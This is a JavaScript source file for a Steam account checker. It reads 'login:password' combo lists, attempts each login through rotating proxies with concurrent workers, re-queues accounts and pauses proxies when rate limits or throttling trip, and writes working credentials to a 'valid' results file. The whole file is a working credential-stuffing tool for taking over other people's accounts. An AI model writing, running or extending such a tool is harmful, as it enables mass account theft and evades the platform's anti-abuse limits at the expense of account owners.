import SteamUser from "steam-user";
import yargs from "yargs";
import fs from "fs";
import readline from "readline";
import axios from "axios";
import pino from "pino";

var accounts = [];
var proxys = [];

const args = yargs(process.argv)
    .option("valid", {
        alias: "v",
        type: "string",
        description: "Name of the file to save valid accounts",
        default: "valid.txt",
    })
    .option("invalid", {
        alias: "i",
        type: "string",
        description: "Name of the file to save invalid accounts",
        default: "invalid.txt",
    })
    .option("timeout", {
        alias: "t",
        type: "number",
        description: "Timeout after maxumum failed logins",
        default: 300000,
    })
    .option("max-fails", {
        alias: "m",
        type: "number",
        description: "Maximum number of failed logins before pause script",
        default: 3,
    })
    .option("concurrents", {
        alias: "c",
        type: "number",
        description: "Number of concurrent logins",
        default: 1,
    })
    .option("debug", {
        alias: "d",
        type: "boolean",
        description: "Enable debug mode",
        default: false,
    })
    .option("rejectGuard", {
        alias: "r",
        type: "boolean",
        description: "Reject accounts which use Steam Guard Verification",
        default: true,
    })
    .option("proxys", {
        alias: "p",
        type: "string",
        description:
            "Path to the proxy file, all proxies must be in the format 'ip:port'",
    })
    .option("accounts", {
        alias: "a",
        type: "string",
        description:
            "Path to the account file, all accounts must be in the format 'login:password'",
    })
    .demandOption(
        ["accounts"],
        "Account file is required"
    )
    .help().argv;

const logger = pino({
    level: args.debug ? 'debug' : 'info',
    transport: {
        target: 'pino-pretty',
        options: {
            colorize: true,
            translateTime: 'SYS:standard',
            ignore: 'pid,hostname'
        }
    },
});

async function bootstrap() {
    if (args.proxys) {
        logger.info(`Proxy mode is enabled. Loading proxies from: ${args.proxys}`);
        await loadProxys(args.proxys);
    } else {
        logger.info("Proxy mode is disabled.");
    }


    await loadAccounts(args.accounts);
    logger.info(`Accounts file: ${args.accounts} is initialized. Loaded accounts: ${accounts.length}`);

    initiateChecking();
}

//account init part\\
async function loadAccounts(path = 'accounts.txt') {
    if (!fs.existsSync(`./${path}`, "utf-8")) {
        logger.error(`Account file ${path} does not exist.`);
        process.exit(1);
    }

    const fileStream = fs.createReadStream(`./${path}`, "utf-8");
    const rl = readline.createInterface({
        input: fileStream,
        crlfDelay: Infinity,
    });

    for await (const line of rl) {
        const account = line.split(":");
        if (account.length >= 2) {
            logger.debug(`Account loaded: ${account[0]}`);
            accounts.push(account);
        }
    }

    rl.close();
    fileStream.close();
}

//proxy init part\\
async function loadProxys(path = 'proxys.txt') {

    if (!fs.existsSync(`./${path}`, "utf-8")) {
        return logger.warn(`Proxy file ${path} does not exist.`);
    }

    const proxyFile = fs.readFileSync(path, "utf-8");
    const proxysList = proxyFile.split("\n").filter((line) => line.trim() !== "");

    if (proxysList.length === 0) {
        logger.warn(`Proxy not found in ${path} file.`);
        return;
    }

    let active = 0;
    let index = 0;
    const concurrentLimit = 2;

    return new Promise((resolve) => {
        const results = [];

        const next = () => {
            if (index >= proxysList.length && active === 0) {
                logger.info(`Proxy file: ${args.proxys} is initialized. Proxy mode: ${proxys[0] ? "enabled" : "disabled"}. Proxy count: ${proxys.length}`);
                return resolve(results);
            }

            while (active < concurrentLimit && index < proxysList.length) {
                const proxy = proxysList[index++];
                active++;

                checkProxy(proxy)
                    .then(() => {
                        const obj = {
                            proxy: proxy,
                            status: "free",
                            fails: 0,
                            bannedFor: 0,
                        }
                        proxys.push(obj);
                        logger.info(
                            `Proxy ${proxy} (${index}/${proxysList.length}, ${proxys.length}) is valid`
                        );
                    })
                    .catch(() => {
                        logger.warn(
                            `Proxy ${proxy} (${index}/${proxysList.length}) isn't valid`
                        );
                    })
                    .finally(() => {
                        active--;
                        setTimeout(next, 200);
                    });
            }
        };
        next();
    });
}



async function getProxy() {
    if (proxys.length === 0) {
        logger.warn("No proxies available. Skipping proxy selection.");
        await new Promise(r => setTimeout(r, 1000));
        return null;
    }

    const now = Date.now();

    for (const p of proxys) {
        if (p.status === "banned" && p.bannedFor <= now) {
            logger.debug(`Proxy ${p.proxy} is unbanned. Resetting status.`);
            p.status = "free";
            p.fails = 0;
            p.bannedFor = 0;
        }
    }

    const freeProxies = proxys.filter(p => p.status === "free");
    const busyProxies = proxys.filter(p => p.status === "busy");
    const bannedProxies = proxys.filter(p => p.status === "banned");


    if (bannedProxies.length === proxys.length) {
        const waitMs = Math.min(...bannedProxies.map(p => p.bannedFor - now)) + 1000;
        logger.warn(`All proxies are banned. Waiting for unban in ${waitMs / 1000} seconds...`);
        await new Promise(resolve => setTimeout(resolve, waitMs));
        return getProxy();
    }

    if (freeProxies.length === 0 && busyProxies.length > 0) {
        logger.warn("All proxies are busy. Waiting for a free proxy...");
        await new Promise(resolve => setTimeout(resolve, 5000));
        return getProxy();
    }

    if (freeProxies.length > 0) {
        const proxy = freeProxies[0].proxy;
        freeProxies[0].status = "busy";
        logger.debug(`Using proxy: ${proxy}`);
        return proxy;
    }

    logger.error("Unexpected state: No free proxies available, but not all proxies are banned or busy.");
    await new Promise(resolve => setTimeout(resolve, 5000));
    return getProxy();
}

function resolveProxy(proxy, result) {
    const proxyIndex = proxys.findIndex(p => p.proxy === proxy);

    if (proxyIndex === -1) {
        return;
    }

    if (result === "failed") {
        proxys[proxyIndex].fails++;
        logger.warn(`Proxy ${proxy} has an invalid login. Current failures: ${proxys[proxyIndex].fails}/${args.maxFails}`);
        if (proxys[proxyIndex].fails >= args.maxFails) {
            logger.warn(`Proxy ${proxy} has reached maximum fails (${proxys[proxyIndex].fails}). Marking as banned.`);
            proxys[proxyIndex].status = "banned";
            proxys[proxyIndex].bannedFor = Date.now() + args.timeout;
            return;
        }

        proxys[proxyIndex].status = "free";

        return;
    }

    proxys[proxyIndex].status = "free";
}

async function checkProxy(proxy) {
    logger.debug(`Checking proxy: ${proxy}`);
    return new Promise((resolve, reject) => {
        axios
            .get("http://example.com/", {
                timeout: 5000,
                proxy: {
                    host: proxy.split(":")[0],
                    port: parseInt(proxy.split(":")[1]),
                },
            })
            .then(() => {
                resolve();
            })
            .catch((error) => {
                logger.debug(error);
                reject();
            });
    });
}

//checking part\\
async function initiateChecking() {
    const proxyMode = args.proxys ? "enabled" : "disabled";
    logger.info(`Initiating checking with current settings: ${args.concurrents} concurrent logins, proxy mode: ${proxyMode}, max fails: ${args.maxFails}, timeout: ${args.timeout / 1000} seconds, rejectGuard: ${args.rejectGuard}`);

    const tasks = accounts.slice();

    async function worker(id) {
        while (true) {
            let task = tasks.shift();

            if (!task) {
                logger.info(`Worker ${id} has no more tasks. Exiting...`);
                return;
            }

            const [alogin, pass] = task;
            var proxy;

            if (proxys.length > 0) {
                proxy = await getProxy();
                logger.debug(`Worker ${id} using proxy: ${proxy}`);
            }

            logger.info(`[W:${id}] Checking account: ${alogin} with proxy: ${proxy || "none"}`);

            try {
                var status = await login(alogin, pass, proxy);
                switch (status) {
                    case SteamUser.EResult.OK:
                        logger.info(`[W:${id}] Account ${alogin} logged in successfully.`);
                        resolveProxy(proxy, "success");
                        resolveAccount(`${alogin}:${pass}`, SteamUser.EResult.OK);
                        break;
                    case "steamGuardResolve":
                        logger.info(`[W:${id}] Account ${alogin} is under Steam Guard. Resolving, marking proxy as failed.`);
                        resolveProxy(proxy, "failed");
                        resolveAccount(`${alogin}:${pass}`, SteamUser.EResult.OK);
                        break;
                    default:
                        logger.info(`[W:${id}] Account ${alogin} logged in successfully.`);
                        resolveProxy(proxy, "success");
                        resolveAccount(`${alogin}:${pass}`, SteamUser.EResult.OK);
                        break;
                }
            } catch (err) {
                const errCode = typeof err === 'number' ? err : err?.eresult || -1;
                switch (errCode) {
                    case (-1):
                        logger.warn(`[W:${id}] Unknown error for account ${alogin}`)
                    case SteamUser.EResult.RateLimitExceeded:
                        logger.warn(`[W:${id}] Rate limit exceeded for account ${alogin}.`);
                        tasks.push([alogin, pass]);
                        if (proxys.length <= 0) {
                            logger.warn(`[W:${id}] Timeout for ${args.timeout / 1000} seconds.`);
                            await new Promise(resolve => setTimeout(resolve, args.timeout));
                        }
                        break;
                    case SteamUser.EResult.AccountLoginDeniedThrottle:
                        logger.warn(`[W:${id}] Account ${alogin} is throttled.`);
                        tasks.push([alogin, pass]);
                        if (proxys.length <= 0) {
                            logger.warn(`[W:${id}] Timeout for ${args.timeout / 1000} seconds.`);
                            await new Promise(resolve => setTimeout(resolve, args.timeout));
                        }
                        break;
                    case SteamUser.EResult.InvalidPassword:
                        logger.error(`[W:${id}] Invalid password for account ${alogin}.`);
                        break;
                    case SteamUser.EResult.AccountLogonDenied:
                        logger.error(`[W:${id}] Account ${alogin} is not allowed to log in.`);
                        break;
                    case SteamUser.EResult.TwoFactorCodeMismatch:
                        logger.error(`[W:${id}] Two-factor code mismatch for account ${alogin}.`);
                        break;
                    case SteamUser.EResult.AccountLoginDeniedNeedTwoFactor:
                        logger.error(`[W:${id}] Account ${alogin} requires two-factor authentication.`);
                        break;
                    case SteamUser.EResult.InvalidLoginAuthCode:
                        logger.error(`[W:${id}] Rejecting Steam Guard account or invalid login auth code (2FA) for account ${alogin}.`);
                        break;
                    default:
                        logger.error(`[W:${id}] Error logging in with account ${alogin}: ${err}`);
                }
                resolveProxy(proxy, "failed");
                resolveAccount(`${alogin}:${pass}`, errCode);
            }
        }
    }

    const workers = [];
    for (let i = 0; i < args.concurrents; i++) {
        workers.push(worker(i + 1));
    }

    await Promise.all(workers);

    logger.info("=== All accounts processed ===");
}



async function login(accountName, password, proxy) {
    logger.debug(`Logging in with account: ${accountName} using proxy: ${proxy || "none"}`);
    return new Promise((resolve, reject) => {

        let client = new SteamUser(proxy ? { httpProxy: `http://${proxy}` } : {});

        client.on("steamGuard", (domain, callback) => {
            if (args.rejectGuard) {
                logger.debug(`Skipping Steam Guard for account: ${accountName}`);
                callback("12345");
                reject(SteamUser.EResult.InvalidLoginAuthCode);
            } else {
                logger.debug(`Resolving steam guard account: ${accountName}`);
                resolve("steamGuardResolve");
            }
        })

        client.on("loggedOn", () => {
            client.removeAllListeners();
            client.logOff();

            resolve(SteamUser.EResult.OK);
        });

        client.on("error", (err) => {
            const errCode = err?.eresult || -1;
            client.removeAllListeners();
            reject(errCode);
        });

        client.logOn({
            accountName: accountName,
            password: password
        });
    });
}

function resolveAccount(account, eresult) {
    if (eresult === SteamUser.EResult.AccountLoginDeniedThrottle || eresult === SteamUser.EResult.RateLimitExceeded) {
        return;
    }

    if (!fs.existsSync(`./results`)) {
        fs.mkdirSync(`./results`, { recursive: true });
    }

    if (eresult === -1) {
        fs.appendFileSync(`./results/unknown.txt`, `${account}\n`, {
            flags: "a",
            encoding: "utf-8"
        });
    }

    if (eresult === SteamUser.EResult.OK) {
        fs.appendFileSync(`./results/${args.valid}`, `${account}\n`, {
            flags: "a",
            encoding: "utf-8"
        });
    } else {
        fs.appendFileSync(`./results/${args.invalid}`, `${account}\n`, {
            flags: "a",
            encoding: "utf-8"
        });
    }
}


bootstrap();
